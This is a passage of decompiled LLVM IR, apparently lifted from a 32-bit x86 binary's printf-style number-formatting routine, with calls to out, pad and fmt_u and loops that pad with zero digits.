  %v1_8053015 = add i32 %v0_805300d, 52
  %v2_8053015 = inttoptr i32 %v1_8053015 to i32*
  %v3_8053015 = load i32, i32* %v2_8053015, align 4
  store i32 %v3_8053015, i32* @eax, align 4
  %v0_8053019 = call i32 @out()
  store i32 %v0_8053019, i32* %eax.global-to-local, align 4
  store i32 48, i32* @edx, align 4
  %v0_8053023 = load i32, i32* @esp, align 4
  %v1_8053023 = inttoptr i32 %v0_8053023 to i32*
  %v2_8053023 = load i32, i32* %v1_8053023, align 4
  store i32 %v2_8053023, i32* @esi, align 4
  %v3_8053023 = add i32 %v0_8053023, 4
  %v1_8053024 = inttoptr i32 %v3_8053023 to i32*
  %v2_8053024 = load i32, i32* %v1_8053024, align 4
  store i32 %v2_8053024, i32* @edi, align 4
  %v1_8053025 = add i32 %v0_8053023, 60
  %v2_8053025 = inttoptr i32 %v1_8053025 to i32*
  %v3_8053025 = load i32, i32* %v2_8053025, align 4
  %v1_8053029 = xor i32 %v3_8053025, 65536
  store i32 %v1_8053029, i32* %eax.global-to-local, align 4
  store i32 %v1_8053029, i32* %v1_8053024, align 4
  %v1_805302f = add i32 %v0_8053023, 124
  %v2_805302f = inttoptr i32 %v1_805302f to i32*
  %v3_805302f = load i32, i32* %v2_805302f, align 4
  store i32 %v3_805302f, i32* %v1_8053023, align 4
  %v1_8053033 = add i32 %v0_8053023, 64
  %v2_8053033 = inttoptr i32 %v1_8053033 to i32*
  %v3_8053033 = load i32, i32* %v2_8053033, align 4
  store i32 %v3_8053033, i32* @ecx, align 4
  %v1_8053037 = add i32 %v0_8053023, 52
  %v2_8053037 = inttoptr i32 %v1_8053037 to i32*
  %v3_8053037 = load i32, i32* %v2_8053037, align 4
  store i32 %v3_8053037, i32* @eax, align 4
  %v0_805303b = call i32 @pad()
  store i32 %v0_805303b, i32* %eax.global-to-local, align 4
  %v0_8053040 = load i32, i32* @esp, align 4
  %v1_8053040 = add i32 %v0_8053040, 16
  %v1_8053043 = add i32 %v0_8053040, 128
  %v2_8053043 = inttoptr i32 %v1_8053043 to i32*
  %v3_8053043 = load i32, i32* %v2_8053043, align 4
  %v12_8053043 = icmp eq i32 %v3_8053043, 102
  %v1_8053048 = icmp eq i1 %v12_8053043, false
  br i1 %v1_8053048, label %dec_label_pc_8053140, label %dec_label_pc_805304e

dec_label_pc_805304e:                             ; preds = %dec_label_pc_8052fe9
  %v1_805304e = add i32 %v0_8053040, 120
  %v2_805304e = inttoptr i32 %v1_805304e to i32*
  %v3_805304e = load i32, i32* %v2_805304e, align 4
  store i32 %v3_805304e, i32* @ebp, align 4
  %v1_8053052 = add i32 %v0_8053040, 112
  %v2_8053052 = inttoptr i32 %v1_8053052 to i32*
  %v3_8053052 = load i32, i32* %v2_8053052, align 4
  store i32 %v3_8053052, i32* %ecx.global-to-local, align 4
  %tmp559 = icmp ugt i32 %v3_805304e, %v3_8053052
  br i1 %tmp559, label %dec_label_pc_805305a, label %dec_label_pc_805305c

dec_label_pc_805305a:                             ; preds = %dec_label_pc_805304e
  store i32 %v3_8053052, i32* @ebp, align 4
  br label %dec_label_pc_805305c

dec_label_pc_805305c:                             ; preds = %dec_label_pc_805304e, %dec_label_pc_805305a
  %v0_805305c = phi i32 [ %v3_805304e, %dec_label_pc_805304e ], [ %v3_8053052, %dec_label_pc_805305a ]
  store i32 %v0_805305c, i32* @esi, align 4
  %v1_805305e = add i32 %v0_8053040, 7552
  store i32 %v1_805305e, i32* @ebx, align 4
  %v4_80530a9465 = load i32, i32* %v2_805304e, align 4
  %tmp560 = icmp ugt i32 %v0_805305c, %v4_80530a9465
  br i1 %tmp560, label %dec_label_pc_80530af, label %dec_label_pc_8053067

dec_label_pc_8053067:                             ; preds = %dec_label_pc_805305c, %dec_label_pc_8053097.dec_label_pc_8053067_crit_edge
  %v0_805306b = phi i32 [ %v0_805306b.pre, %dec_label_pc_8053097.dec_label_pc_8053067_crit_edge ], [ %v1_805305e, %dec_label_pc_805305c ]
  %v0_8053067475 = phi i32 [ %v0_80530a9.pre, %dec_label_pc_8053097.dec_label_pc_8053067_crit_edge ], [ %v0_805305c, %dec_label_pc_805305c ]
  %v1_8053067 = inttoptr i32 %v0_8053067475 to i32*
  %v2_8053067 = load i32, i32* %v1_8053067, align 4
  store i32 %v2_8053067, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  store i32 %v0_805306b, i32* @ecx, align 4
  %v0_805306d = call i32 @fmt_u()
  store i32 %v0_805306d, i32* %eax.global-to-local, align 4
  %v0_8053072 = load i32, i32* @esi, align 4
  %v1_8053072 = load i32, i32* @ebp, align 4
  %v12_8053072 = icmp eq i32 %v0_8053072, %v1_8053072
  %v1_8053074 = icmp eq i1 %v12_8053072, false
  br i1 %v1_8053074, label %dec_label_pc_805307c, label %dec_label_pc_8053084

dec_label_pc_8053078:                             ; preds = %dec_label_pc_805307c
  %v1_8053078 = add i32 %v0_8053078, -1
  store i32 %v1_8053078, i32* %eax.global-to-local, align 4
  %v1_8053079 = inttoptr i32 %v1_8053078 to i8*
  store i8 48, i8* %v1_8053079, align 1
  %v0_805307c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805307c

dec_label_pc_805307c:                             ; preds = %dec_label_pc_8053067, %dec_label_pc_8053078
  %v0_8053078 = phi i32 [ %v0_805307c.pre, %dec_label_pc_8053078 ], [ %v0_805306d, %dec_label_pc_8053067 ]
  %v1_805307c = load i32, i32* @esp, align 4
  %v2_805307c = add i32 %v1_805307c, 28
  %v3_805307c = inttoptr i32 %v2_805307c to i32*
  %v4_805307c = load i32, i32* %v3_805307c, align 4
  %tmp561 = icmp ugt i32 %v0_8053078, %v4_805307c
  br i1 %tmp561, label %dec_label_pc_8053078, label %dec_label_pc_8053097

dec_label_pc_8053084:                             ; preds = %dec_label_pc_8053067
  %v1_8053084 = load i32, i32* @ebx, align 4
  %v12_8053084 = icmp eq i32 %v0_805306d, %v1_8053084
  %v1_8053086 = icmp eq i1 %v12_8053084, false
  %v0_805309d.pre = load i32, i32* @esp, align 4
  br i1 %v1_8053086, label %dec_label_pc_8053097, label %dec_label_pc_8053088

dec_label_pc_8053088:                             ; preds = %dec_label_pc_8053084
  %v1_8053088 = add i32 %v0_805309d.pre, 7535
  %v2_8053088 = inttoptr i32 %v1_8053088 to i8*
  store i8 48, i8* %v2_8053088, align 1
  %v0_8053090 = load i32, i32* @esp, align 4
  %v1_8053090 = add i32 %v0_8053090, 7535
  store i32 %v1_8053090, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053097

dec_label_pc_8053097:                             ; preds = %dec_label_pc_805307c, %dec_label_pc_8053084, %dec_label_pc_8053088
  %v0_805309d = phi i32 [ %v0_8053090, %dec_label_pc_8053088 ], [ %v0_805309d.pre, %dec_label_pc_8053084 ], [ %v1_805307c, %dec_label_pc_805307c ]
  %v0_8053099 = phi i32 [ %v1_8053090, %dec_label_pc_8053088 ], [ %v0_805306d, %dec_label_pc_8053084 ], [ %v0_8053078, %dec_label_pc_805307c ]
  %v0_8053097 = load i32, i32* @ebx, align 4
  store i32 %v0_8053099, i32* @edx, align 4
  %v2_805309b = sub i32 %v0_8053097, %v0_8053099
  store i32 %v2_805309b, i32* @ecx, align 4
  %v1_805309d = add i32 %v0_805309d, 36
  %v2_805309d = inttoptr i32 %v1_805309d to i32*
  %v3_805309d = load i32, i32* %v2_805309d, align 4
  store i32 %v3_805309d, i32* @eax, align 4
  %v0_80530a1 = load i32, i32* @esi, align 4
  %v1_80530a1 = add i32 %v0_80530a1, 4
  store i32 %v1_80530a1, i32* @esi, align 4
  %v0_80530a4 = call i32 @out()
  store i32 %v0_80530a4, i32* %eax.global-to-local, align 4
  %v0_80530a9.pre = load i32, i32* @esi, align 4
  %v1_80530a9.pre = load i32, i32* @esp, align 4
  %v2_80530a9 = add i32 %v1_80530a9.pre, 104
  %v3_80530a9 = inttoptr i32 %v2_80530a9 to i32*
  %v4_80530a9 = load i32, i32* %v3_80530a9, align 4
  %tmp562 = icmp ugt i32 %v0_80530a9.pre, %v4_80530a9
  br i1 %tmp562, label %dec_label_pc_80530af, label %dec_label_pc_8053097.dec_label_pc_8053067_crit_edge

dec_label_pc_8053097.dec_label_pc_8053067_crit_edge: ; preds = %dec_label_pc_8053097
  %v0_805306b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053067

dec_label_pc_80530af:                             ; preds = %dec_label_pc_8053097, %dec_label_pc_805305c
  %v0_80530bd.lcssa = phi i32 [ %v1_8053040, %dec_label_pc_805305c ], [ %v1_80530a9.pre, %dec_label_pc_8053097 ]
  %v1_80530af = add i32 %v0_80530bd.lcssa, 52
  %v2_80530af = inttoptr i32 %v1_80530af to i32*
  %v3_80530af = load i32, i32* %v2_80530af, align 4
  %v4_80530af = icmp eq i32 %v3_80530af, 0
  %v1_80530b4 = icmp eq i1 %v4_80530af, false
  br i1 %v1_80530b4, label %dec_label_pc_80530bd, label %dec_label_pc_80530b6

dec_label_pc_80530b6:                             ; preds = %dec_label_pc_80530af
  %v1_80530b6 = add i32 %v0_80530bd.lcssa, 44
  %v2_80530b6 = inttoptr i32 %v1_80530b6 to i8*
  %v3_80530b6 = load i8, i8* %v2_80530b6, align 1
  %v4_80530b6 = and i8 %v3_80530b6, 8
  %v5_80530b6 = icmp eq i8 %v4_80530b6, 0
  br i1 %v5_80530b6, label %dec_label_pc_805310c, label %dec_label_pc_80530bd

dec_label_pc_80530bd:                             ; preds = %dec_label_pc_80530b6, %dec_label_pc_80530af
  %v1_80530bd = add i32 %v0_80530bd.lcssa, 36
  %v2_80530bd = inttoptr i32 %v1_80530bd to i32*
  %v3_80530bd = load i32, i32* %v2_80530bd, align 4
  store i32 %v3_80530bd, i32* @eax, align 4
  store i32 1, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8054a54.407 to i32), i32* @edx, align 4
  %v0_80530cb = call i32 @out()
  store i32 %v0_80530cb, i32* %eax.global-to-local, align 4
  %v0_805310c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805310c

dec_label_pc_80530d2:                             ; preds = %dec_label_pc_8053119
  %v1_80530d2 = inttoptr i32 %v0_8053113 to i32*
  %v2_80530d2 = load i32, i32* %v1_80530d2, align 4
  store i32 %v2_80530d2, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80530d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80530d6, i32* @ecx, align 4
  %v0_80530d8 = call i32 @fmt_u()
  store i32 %v0_80530d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530e3

dec_label_pc_80530df:                             ; preds = %dec_label_pc_80530e3
  %v1_80530df = add i32 %v0_80530f7, -1
  store i32 %v1_80530df, i32* %eax.global-to-local, align 4
  %v1_80530e0 = inttoptr i32 %v1_80530df to i8*
  store i8 48, i8* %v1_80530e0, align 1
  %v0_80530e3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530e3

dec_label_pc_80530e3:                             ; preds = %dec_label_pc_80530d2, %dec_label_pc_80530df
  %v0_80530f7 = phi i32 [ %v0_80530d8, %dec_label_pc_80530d2 ], [ %v0_80530e3.pre, %dec_label_pc_80530df ]
  %v1_80530e3 = load i32, i32* @esp, align 4
  %v2_80530e3 = add i32 %v1_80530e3, 28
  %v3_80530e3 = inttoptr i32 %v2_80530e3 to i32*
  %v4_80530e3 = load i32, i32* %v3_80530e3, align 4
  %tmp563 = icmp ugt i32 %v0_80530f7, %v4_80530e3
  br i1 %tmp563, label %dec_label_pc_80530df, label %dec_label_pc_80530e9

dec_label_pc_80530e9:                             ; preds = %dec_label_pc_80530e3
  %v1_80530e9 = add i32 %v1_80530e3, 52
  %v2_80530e9 = inttoptr i32 %v1_80530e9 to i32*
  %v3_80530e9 = load i32, i32* %v2_80530e9, align 4
  %v1_80530ed = add i32 %v3_80530e9, -9
  %v6_80530ed = sub i32 8, %v3_80530e9
  %v7_80530ed = and i32 %v6_80530ed, %v3_80530e9
  %v8_80530ed = icmp slt i32 %v7_80530ed, 0
  %v9_80530ed = icmp eq i32 %v1_80530ed, 0
  %v10_80530ed = icmp slt i32 %v1_80530ed, 0
  %v3_80530f0 = icmp ne i1 %v10_80530ed, %v8_80530ed
  %v4_80530f0 = or i1 %v9_80530ed, %v3_80530f0
  br i1 %v4_80530f0, label %dec_label_pc_80530f7, label %dec_label_pc_80530f2

dec_label_pc_80530f2:                             ; preds = %dec_label_pc_80530e9
  br label %dec_label_pc_80530f7

dec_label_pc_80530f7:                             ; preds = %dec_label_pc_80530e9, %dec_label_pc_80530f2
  %storemerge544 = phi i32 [ 9, %dec_label_pc_80530f2 ], [ %v3_80530e9, %dec_label_pc_80530e9 ]
  store i32 %storemerge544, i32* @ecx, align 4
  store i32 %v0_80530f7, i32* @edx, align 4
  %v1_80530f9 = add i32 %v1_80530e3, 36
  %v2_80530f9 = inttoptr i32 %v1_80530f9 to i32*
  %v3_80530f9 = load i32, i32* %v2_80530f9, align 4
  store i32 %v3_80530f9, i32* @eax, align 4
  %v0_80530fd = load i32, i32* @esi, align 4
  %v1_80530fd = add i32 %v0_80530fd, 4
  store i32 %v1_80530fd, i32* @esi, align 4
  %v0_8053100 = call i32 @out()
  store i32 %v0_8053100, i32* %eax.global-to-local, align 4
  %v0_8053105 = load i32, i32* @esp, align 4
  %v1_8053105 = add i32 %v0_8053105, 52
  %v2_8053105 = inttoptr i32 %v1_8053105 to i32*
  %v3_8053105 = load i32, i32* %v2_8053105, align 4
  %v4_8053105 = add i32 %v3_8053105, -9
  store i32 %v4_8053105, i32* %v2_8053105, align 4
  %v1_8053113.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053113

dec_label_pc_805310c:                             ; preds = %dec_label_pc_80530b6, %dec_label_pc_80530bd
  %v0_805310c = phi i32 [ %v0_80530bd.lcssa, %dec_label_pc_80530b6 ], [ %v0_805310c.pre, %dec_label_pc_80530bd ]
  %v1_805310c = add i32 %v0_805310c, 7536
  store i32 %v1_805310c, i32* @ebx, align 4
  br label %dec_label_pc_8053113

dec_label_pc_8053113:                             ; preds = %dec_label_pc_80530f7, %dec_label_pc_805310c
  %v1_8053120 = phi i32 [ %v1_8053113.pre, %dec_label_pc_80530f7 ], [ %v0_805310c, %dec_label_pc_805310c ]
  %v0_8053113 = load i32, i32* @esi, align 4
  %v2_8053113 = add i32 %v1_8053120, 100
  %v3_8053113 = inttoptr i32 %v2_8053113 to i32*
  %v4_8053113 = load i32, i32* %v3_8053113, align 4
  %v10_8053113 = icmp ult i32 %v0_8053113, %v4_8053113
  %v1_8053117 = icmp eq i1 %v10_8053113, false
  %.pre210 = add i32 %v1_8053120, 52
  %.pre211 = inttoptr i32 %.pre210 to i32*
  br i1 %v1_8053117, label %dec_label_pc_8053120, label %dec_label_pc_8053119

dec_label_pc_8053119:                             ; preds = %dec_label_pc_8053113
  %v3_8053119 = load i32, i32* %.pre211, align 4
  %tmp254 = icmp slt i32 %v3_8053119, 1
  %tmp255 = icmp eq i1 %tmp254, false
  br i1 %tmp255, label %dec_label_pc_80530d2, label %dec_label_pc_8053120

dec_label_pc_8053120:                             ; preds = %dec_label_pc_8053113, %dec_label_pc_8053119
  %v0_8053120 = load i32, i32* @ebx, align 4
  %v2_8053120 = add i32 %v1_8053120, -4
  %v3_8053120 = inttoptr i32 %v2_8053120 to i32*
  store i32 %v0_8053120, i32* %v3_8053120, align 4
  store i32 48, i32* @edx, align 4
  %v0_8053126 = load i32, i32* @ebx, align 4
  %v2_8053126 = add i32 %v1_8053120, -8
  %v3_8053126 = inttoptr i32 %v2_8053126 to i32*
  store i32 %v0_8053126, i32* %v3_8053126, align 4
  %v3_8053127 = load i32, i32* %.pre211, align 4
  store i32 %v3_8053127, i32* %ecx.global-to-local, align 4
  %v1_805312b = add i32 %v1_8053120, -12
  %v2_805312b = inttoptr i32 %v1_805312b to i32*
  store i32 0, i32* %v2_805312b, align 4
  %v1_805312d = add i32 %v1_8053120, -16
  %v2_805312d = inttoptr i32 %v1_805312d to i32*
  store i32 9, i32* %v2_805312d, align 4
  %v1_805312f = add i32 %v1_8053120, 36
  %v2_805312f = inttoptr i32 %v1_805312f to i32*
  %v3_805312f = load i32, i32* %v2_805312f, align 4
  store i32 %v3_805312f, i32* @eax, align 4
  %v0_8053133 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053133 = add i32 %v0_8053133, 9
  store i32 %v1_8053133, i32* @ecx, align 4
  %v0_8053136 = call i32 @pad()
  br label %dec_label_pc_805322f

dec_label_pc_8053140:                             ; preds = %dec_label_pc_8052fe9
  %v1_8053140 = add i32 %v0_8053040, 112
  %v2_8053140 = inttoptr i32 %v1_8053140 to i32*
  %v3_8053140 = load i32, i32* %v2_8053140, align 4
  store i32 %v3_8053140, i32* %ebx.global-to-local, align 4
  %v1_8053144 = add i32 %v0_8053040, 116
  %v2_8053144 = inttoptr i32 %v1_8053144 to i32*
  %v3_8053144 = load i32, i32* %v2_8053144, align 4
  %tmp564 = icmp ugt i32 %v3_8053144, %v3_8053140
  br i1 %tmp564, label %dec_label_pc_8053151, label %dec_label_pc_805314a

dec_label_pc_805314a:                             ; preds = %dec_label_pc_8053140
  %v1_805314a = add i32 %v3_8053140, 4
  store i32 %v1_805314a, i32* %ebx.global-to-local, align 4
  store i32 %v1_805314a, i32* %v2_8053144, align 4
  %v0_8053151.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053151

dec_label_pc_8053151:                             ; preds = %dec_label_pc_8053140, %dec_label_pc_805314a
  %v0_8053151 = phi i32 [ %v1_8053040, %dec_label_pc_8053140 ], [ %v0_8053151.pre, %dec_label_pc_805314a ]
  %v1_8053151 = add i32 %v0_8053151, 96
  %v2_8053151 = inttoptr i32 %v1_8053151 to i32*
  %v3_8053151 = load i32, i32* %v2_8053151, align 4
  store i32 %v3_8053151, i32* @ebx, align 4
  %v1_8053155 = add i32 %v0_8053151, 7536
  store i32 %v1_8053155, i32* @edi, align 4
  br label %dec_label_pc_80531eb

dec_label_pc_8053161:                             ; preds = %dec_label_pc_80531f1
  %v1_8053161 = inttoptr i32 %v0_8053161 to i32*
  %v2_8053161 = load i32, i32* %v1_8053161, align 4
  store i32 %v2_8053161, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8053165 = load i32, i32* @edi, align 4
  store i32 %v0_8053165, i32* @ecx, align 4
  %v0_8053167 = call i32 @fmt_u()
  store i32 %v0_8053167, i32* %eax.global-to-local, align 4
  %v1_805316c = load i32, i32* @edi, align 4
  %v12_805316c = icmp eq i32 %v0_8053167, %v1_805316c
  %v1_805316e = icmp eq i1 %v12_805316c, false
  %v1_805317f.pre = load i32, i32* @esp, align 4
  br i1 %v1_805316e, label %dec_label_pc_805317f, label %dec_label_pc_8053170

dec_label_pc_8053170:                             ; preds = %dec_label_pc_8053161
  %v1_8053170 = add i32 %v1_805317f.pre, 7535
  %v2_8053170 = inttoptr i32 %v1_8053170 to i8*
  store i8 48, i8* %v2_8053170, align 1
  %v0_8053178 = load i32, i32* @esp, align 4
  %v1_8053178 = add i32 %v0_8053178, 7535
  store i32 %v1_8053178, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805317f

dec_label_pc_805317f:                             ; preds = %dec_label_pc_8053161, %dec_label_pc_8053170
  %v0_8053195 = phi i32 [ %v1_8053178, %dec_label_pc_8053170 ], [ %v0_8053167, %dec_label_pc_8053161 ]
  %v0_805319f = phi i32 [ %v0_8053178, %dec_label_pc_8053170 ], [ %v1_805317f.pre, %dec_label_pc_8053161 ]
  %v0_805317f = load i32, i32* @ebx, align 4
  %v2_805317f = add i32 %v0_805319f, 96
  %v3_805317f = inttoptr i32 %v2_805317f to i32*
  %v4_805317f = load i32, i32* %v3_805317f, align 4
  %v15_805317f = icmp eq i32 %v0_805317f, %v4_805317f
  store i32 %v0_8053195, i32* @esi, align 4
  %v1_8053185 = icmp eq i1 %v15_805317f, false
  br i1 %v1_8053185, label %dec_label_pc_805318d.preheader, label %dec_label_pc_8053195

dec_label_pc_805318d.preheader:                   ; preds = %dec_label_pc_805317f
  %v2_805318d477 = add i32 %v0_805319f, 28
  %v3_805318d478 = inttoptr i32 %v2_805318d477 to i32*
  %v4_805318d479 = load i32, i32* %v3_805318d478, align 4
  %tmp565 = icmp ugt i32 %v0_8053195, %v4_805318d479
  br i1 %tmp565, label %dec_label_pc_8053189, label %dec_label_pc_80531c9

dec_label_pc_8053189:                             ; preds = %dec_label_pc_8053189, %dec_label_pc_805318d.preheader
  %v0_8053189489 = phi i32 [ %v0_805318d.pre, %dec_label_pc_8053189 ], [ %v0_8053195, %dec_label_pc_805318d.preheader ]
  %v1_8053189 = add i32 %v0_8053189489, -1
  store i32 %v1_8053189, i32* @esi, align 4
  %v1_805318a = inttoptr i32 %v1_8053189 to i8*
  store i8 48, i8* %v1_805318a, align 1
  %v0_805318d.pre = load i32, i32* @esi, align 4
  %v1_805318d.pre = load i32, i32* @esp, align 4
  %v2_805318d = add i32 %v1_805318d.pre, 28
  %v3_805318d = inttoptr i32 %v2_805318d to i32*
  %v4_805318d = load i32, i32* %v3_805318d, align 4
  %tmp566 = icmp ugt i32 %v0_805318d.pre, %v4_805318d
  br i1 %tmp566, label %dec_label_pc_8053189, label %dec_label_pc_80531c9

dec_label_pc_8053195:                             ; preds = %dec_label_pc_805317f
  store i32 %v0_8053195, i32* @edx, align 4
  store i32 1, i32* @ecx, align 4
  %v1_805319c = add i32 %v0_8053195, 1
  store i32 %v1_805319c, i32* @esi, align 4
  %v1_805319f = add i32 %v0_805319f, 36
  %v2_805319f = inttoptr i32 %v1_805319f to i32*
  %v3_805319f = load i32, i32* %v2_805319f, align 4
  store i32 %v3_805319f, i32* @eax, align 4
  %v0_80531a3 = call i32 @out()
  store i32 %v0_80531a3, i32* %eax.global-to-local, align 4
  %v0_80531a8 = load i32, i32* @esp, align 4
  %v1_80531a8 = add i32 %v0_80531a8, 52
  %v2_80531a8 = inttoptr i32 %v1_80531a8 to i32*
  %v3_80531a8 = load i32, i32* %v2_80531a8, align 4
  %tmp256 = icmp slt i32 %v3_80531a8, 1
  %tmp257 = icmp eq i1 %tmp256, false
  br i1 %tmp257, label %dec_label_pc_80531b6, label %dec_label_pc_80531af

dec_label_pc_80531af:                             ; preds = %dec_label_pc_8053195
  %v1_80531af = add i32 %v0_80531a8, 44
  %v2_80531af = inttoptr i32 %v1_80531af to i8*
  %v3_80531af = load i8, i8* %v2_80531af, align 1
  %v4_80531af = and i8 %v3_80531af, 8
  %v5_80531af = icmp eq i8 %v4_80531af, 0
  br i1 %v5_80531af, label %dec_label_pc_80531c9, label %dec_label_pc_80531b6

dec_label_pc_80531b6:                             ; preds = %dec_label_pc_80531af, %dec_label_pc_8053195
  %v1_80531b6 = add i32 %v0_80531a8, 36
  %v2_80531b6 = inttoptr i32 %v1_80531b6 to i32*
  %v3_80531b6 = load i32, i32* %v2_80531b6, align 4
  store i32 %v3_80531b6, i32* @eax, align 4
  store i32 1, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8054a54.407 to i32), i32* @edx, align 4
  %v0_80531c4 = call i32 @out()
  store i32 %v0_80531c4, i32* %eax.global-to-local, align 4
  %v1_80531cd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80531c9

dec_label_pc_80531c9:                             ; preds = %dec_label_pc_8053189, %dec_label_pc_805318d.preheader, %dec_label_pc_80531af, %dec_label_pc_80531b6
  %v0_80531d9 = phi i32 [ %v0_80531a8, %dec_label_pc_80531af ], [ %v1_80531cd.pre, %dec_label_pc_80531b6 ], [ %v0_805319f, %dec_label_pc_805318d.preheader ], [ %v1_805318d.pre, %dec_label_pc_8053189 ]
  %v0_80531c9 = load i32, i32* @edi, align 4
  %v1_80531cb = load i32, i32* @esi, align 4
  %v2_80531cb = sub i32 %v0_80531c9, %v1_80531cb
  store i32 %v2_80531cb, i32* @ebp, align 4
  %v2_80531cd = add i32 %v0_80531d9, 52
  %v3_80531cd = inttoptr i32 %v2_80531cd to i32*
  %v4_80531cd = load i32, i32* %v3_80531cd, align 4
  %v5_80531cd = sub i32 %v2_80531cb, %v4_80531cd
  %v11_80531cd = xor i32 %v4_80531cd, %v2_80531cb
  %v12_80531cd = xor i32 %v5_80531cd, %v2_80531cb
  %v13_80531cd = and i32 %v12_80531cd, %v11_80531cd
  %v14_80531cd = icmp slt i32 %v13_80531cd, 0
  %v15_80531cd = icmp eq i32 %v5_80531cd, 0
  %v16_80531cd = icmp slt i32 %v5_80531cd, 0
  store i32 %v2_80531cb, i32* @ecx, align 4
  %v3_80531d3 = icmp ne i1 %v16_80531cd, %v14_80531cd
  %v4_80531d3 = or i1 %v15_80531cd, %v3_80531d3
  br i1 %v4_80531d3, label %dec_label_pc_80531d9, label %dec_label_pc_80531d5

dec_label_pc_80531d5:                             ; preds = %dec_label_pc_80531c9
  %v3_80531d5 = load i32, i32* %v3_80531cd, align 4
  store i32 %v3_80531d5, i32* @ecx, align 4
  br label %dec_label_pc_80531d9

dec_label_pc_80531d9:                             ; preds = %dec_label_pc_80531c9, %dec_label_pc_80531d5
  %v1_80531d9 = add i32 %v0_80531d9, 36
  %v2_80531d9 = inttoptr i32 %v1_80531d9 to i32*
  %v3_80531d9 = load i32, i32* %v2_80531d9, align 4
  store i32 %v3_80531d9, i32* @eax, align 4
  store i32 %v1_80531cb, i32* @edx, align 4
  %v0_80531df = load i32, i32* @ebx, align 4
  %v1_80531df = add i32 %v0_80531df, 4
  store i32 %v1_80531df, i32* @ebx, align 4
  %v0_80531e2 = call i32 @out()
  store i32 %v0_80531e2, i32* %eax.global-to-local, align 4
  %v0_80531e7 = load i32, i32* @esp, align 4
  %v1_80531e7 = add i32 %v0_80531e7, 52
  %v2_80531e7 = inttoptr i32 %v1_80531e7 to i32*
  %v3_80531e7 = load i32, i32* %v2_80531e7, align 4
  %v4_80531e7 = load i32, i32* @ebp, align 4
  %v5_80531e7 = sub i32 %v3_80531e7, %v4_80531e7
  store i32 %v5_80531e7, i32* %v2_80531e7, align 4
  %v0_80531eb.pre = load i32, i32* @ebx, align 4
  %v1_80531eb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80531eb

dec_label_pc_80531eb:                             ; preds = %dec_label_pc_8053151, %dec_label_pc_80531d9
  %v1_80531fc = phi i32 [ %v0_8053151, %dec_label_pc_8053151 ], [ %v1_80531eb.pre, %dec_label_pc_80531d9 ]
  %v0_8053161 = phi i32 [ %v3_8053151, %dec_label_pc_8053151 ], [ %v0_80531eb.pre, %dec_label_pc_80531d9 ]
  %v2_80531eb = add i32 %v1_80531fc, 100
  %v3_80531eb = inttoptr i32 %v2_80531eb to i32*
  %v4_80531eb = load i32, i32* %v3_80531eb, align 4
  %v10_80531eb = icmp ult i32 %v0_8053161, %v4_80531eb
  %v1_80531ef = icmp eq i1 %v10_80531eb, false
  %.pre = add i32 %v1_80531fc, 52
  %.pre209 = inttoptr i32 %.pre to i32*
  br i1 %v1_80531ef, label %dec_label_pc_80531fc, label %dec_label_pc_80531f1

dec_label_pc_80531f1:                             ; preds = %dec_label_pc_80531eb
  %v3_80531f1 = load i32, i32* %.pre209, align 4
  %v5_80531f1 = icmp slt i32 %v3_80531f1, 0
  %v1_80531f6 = icmp eq i1 %v5_80531f1, false
  br i1 %v1_80531f6, label %dec_label_pc_8053161, label %dec_label_pc_80531fc

dec_label_pc_80531fc:                             ; preds = %dec_label_pc_80531eb, %dec_label_pc_80531f1
  %v0_80531fc = load i32, i32* @ecx, align 4
  %v2_80531fc = add i32 %v1_80531fc, -4
  %v3_80531fc = inttoptr i32 %v2_80531fc to i32*
  store i32 %v0_80531fc, i32* %v3_80531fc, align 4
  store i32 48, i32* @edx, align 4
  %v0_8053202 = load i32, i32* @ecx, align 4
  %v2_8053202 = add i32 %v1_80531fc, -8
  %v3_8053202 = inttoptr i32 %v2_8053202 to i32*
  store i32 %v0_8053202, i32* %v3_8053202, align 4
  %v3_8053203 = load i32, i32* %.pre209, align 4
  store i32 %v3_8053203, i32* %ecx.global-to-local, align 4
  %v1_8053207 = add i32 %v1_80531fc, -12
  %v2_8053207 = inttoptr i32 %v1_8053207 to i32*
  store i32 0, i32* %v2_8053207, align 4
  %v1_8053209 = add i32 %v1_80531fc, -16
  %v2_8053209 = inttoptr i32 %v1_8053209 to i32*
  store i32 18, i32* %v2_8053209, align 4
  %v1_805320b = add i32 %v1_80531fc, 36
  %v2_805320b = inttoptr i32 %v1_805320b to i32*
  %v3_805320b = load i32, i32* %v2_805320b, align 4
  store i32 %v3_805320b, i32* @eax, align 4
  %v0_805320f = load i32, i32* %ecx.global-to-local, align 4
  %v1_805320f = add i32 %v0_805320f, 18
  store i32 %v1_805320f, i32* @ecx, align 4
  %v0_8053212 = call i32 @pad()
  store i32 %v0_8053212, i32* %eax.global-to-local, align 4
  %v0_8053217 = load i32, i32* @esp, align 4
  %v1_8053217 = add i32 %v0_8053217, 92
  %v2_8053217 = inttoptr i32 %v1_8053217 to i32*
  %v3_8053217 = load i32, i32* %v2_8053217, align 4
  store i32 %v3_8053217, i32* @edx, align 4
  %v1_805321b = add i32 %v0_8053217, 7808
  store i32 %v1_805321b, i32* %ecx.global-to-local, align 4
  %v1_8053222 = add i32 %v0_8053217, 52
  %v2_8053222 = inttoptr i32 %v1_8053222 to i32*
  %v3_8053222 = load i32, i32* %v2_8053222, align 4
  store i32 %v3_8053222, i32* @eax, align 4
  %v4_8053226 = load i32, i32* %v2_8053217, align 4
  %v5_8053226 = sub i32 %v1_805321b, %v4_8053226
  store i32 %v5_8053226, i32* @ecx, align 4
  %v0_805322a = call i32 @out()
  br label %dec_label_pc_805322f

